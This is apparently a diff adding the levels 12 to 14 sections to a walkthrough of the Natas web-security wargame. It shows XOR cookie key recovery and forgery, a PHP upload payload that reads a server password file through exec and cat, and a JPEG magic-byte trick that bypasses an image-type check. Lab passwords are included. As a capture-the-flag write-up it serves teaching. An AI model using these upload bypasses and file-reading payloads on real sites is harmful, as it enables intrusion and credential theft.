@@ -245,3 +245,244 @@ For example, we can try `"" /etc/natas_webpass/natas11` as input:
 ![password](pics/natas/2025-06-30-21-00-30.png)
 
 Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+
+## Natas 12
+
+> The page shows this form:
+> ![form](pics/natas/2025-07-01-16-05-38.png)
+
+The code behind the form is:
+
+```php
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+            $mydata['showpassword'] = $tempdata['showpassword'];
+            $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+```
+
+The code uses a cookie called `data` to store the data of the form. The data is "encrypted" with XOR encryption using a key that is not shown in the code.
+The `loadData` function loads the data from the cookie and decodes it, while the `saveData` function saves the data to the cookie after encoding it.
+The "xor_encrypt" function is used to encrypt the data before saving it to the cookie. It uses a key that is not shown in the code, but it is used to XOR each character of the input string with the corresponding character of the key.
+The `bgcolor` parameter is validated with a regular expression to ensure it is a valid hex color code.  
+The `showpassword` parameter is not used in the code, but it is set to "no" by default.  
+To get the password for the next level, we need to set the `showpassword` parameter to "yes" and then save the data to the cookie.  
+To do this, we need the secret key used for the XOR encryption.
+To find the key, we can try to brute force it by trying all possible combinations of characters. However, a better approach is to XOR the known plaintext (default data) with the ciphertext (decoded cookie) to find the key.
+
+The known plaintext is:
+```json
+{"showpassword":"no","bgcolor":"#ffffff"}
+```
+
+The ciphertext is the value of the `data` cookie, which we can get by inspecting the cookies in the browser.
+
+Cookie value: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=`
+
+The following code can be used to recover the key:
+
+```python
+import base64
+encoded = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
+ciphertext = base64.b64decode(encoded)
+plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+recovered = bytes([ciphertext[i] ^ plaintext[i] for i in range(len(plaintext))])
+print(recovered)
+```
+
+I get `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`, so the key is `eDWo`.
+
+Let's check that the key is correct by encrypting the default data with it:
+
+```python
+import base64
+
+def xor_encrypt(inpt, key):
+    return bytes([inpt[i] ^ key[i % len(key)] for i in range(len(inpt))])
+
+key = b'eDWo'
+data = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+encrypted = xor_encrypt(data, key)
+print(base64.b64encode(encrypted))
+```
+
+The key is correct, as it returns the same value as the cookie value.
+Now let's craft our own cookie with the `showpassword` parameter set to "yes":
+
+```python
+import base64
+
+def xor_encrypt(inpt, key):
+    return bytes([inpt[i] ^ key[i % len(key)] for i in range(len(inpt))])
+
+key = b'eDWo'
+data = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
+encrypted = xor_encrypt(data, key)
+print(base64.b64encode(encrypted))
+```
+
+This returns `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`. We put this value in the `data` cookie and refresh the page:
+
+![password](pics/natas/2025-07-01-17-10-02.png)
+
+Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+
+## Natas 13
+
+> The page shows this form:
+> ![form](pics/natas/2025-07-01-17-41-51.png)
+
+The code behind the form is:
+
+```php
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+}
+```
+
+genRandomString():
+- Generates a random string of 10 lowercase letters and digits.
+- Used to create unpredictable filenames for uploads.
+
+makeRandomPath($dir, $ext):
+- Calls genRandomString() to get a random filename.
+- Appends the given extension ($ext).
+- Checks if a file with that name already exists in $dir.
+- If it does, repeats until a unique filename is found.
+- Returns the full path for the new file.
+
+makeRandomPathFromFilename($dir, $fn):
+- Extracts the file extension from the original filename ($fn).
+- Calls makeRandomPath() to generate a unique path in $dir with the same extension.
+
+File upload logic:
+- Checks if the POST request contains a filename field.
+- Calls makeRandomPathFromFilename() to get a unique upload path in the upload directory.
+- Checks if the uploaded file (from $_FILES['uploadedfile']) is larger than 1000 bytes.
+- Otherwise, tries to move the uploaded file to the generated path.
+
+If we try to upload a file with any extension, the extension will be changed to `.jpg`. If we manage to upload a file with a `.php` extension, it will be executed by the server.  
+Let's check the request's payload sent to the server when we upload a file:
+
+![payload](pics/natas/2025-07-01-19-53-51.png)
+
+As we can see we have control over the final filename. Now let's create a php script to read the password in the `/etc/natas_webpass/natas13` file and print it. We can name the file `read13Pass.php`:
+
+```php
+<?php
+$output=null;
+$retval=null;
+exec('cat /etc/natas_webpass/natas13', $output, $retval);
+print_r($output);
+?>
+```
+
+Now we can upload this file to the server. We can intercept and then edit the request with burp suite or any other proxy tool. In this case I'll just use the `Edit and Resend` feature of the browser's developer tools to edit the file name's extension to `.php`.
+
+![password](pics/natas/2025-07-01-20-14-26.png)
+
+Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+## Natas 14
+
+> The page shows this form:
+> ![form](pics/natas/2025-07-01-20-16-15.png)
+
+The source code now implements some kind of check on the extention of the uploaded file:
+
+```php
+if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+    echo "File is not an image";
+}
+```
+
+If we look at how `exif_imagetype` works, we can see that it reads the first bytes of the image file to determine its type based on its signature (not the file extension). This means we can bypass the extension check by uploading a file with a valid image signature, even if the file itself is not a valid image (a script for example).
+
+To do this, we can craft a valid JPEG file and then append our PHP code to it:
+
+```bash
+echo -n -e "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00" > image.jpg
+cat read14pass.php >> image.jpg
+mv image.jpg read14passImage.php
+```
+
+Where `read14pass.php` is the same code we used in the previous level, with the only difference being that we print the password for natas14.  
+Now we can upload the file and do the same interception and edit trick as before.
+
+![password](pics/natas/2025-07-01-20-34-56.png)
+
+Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
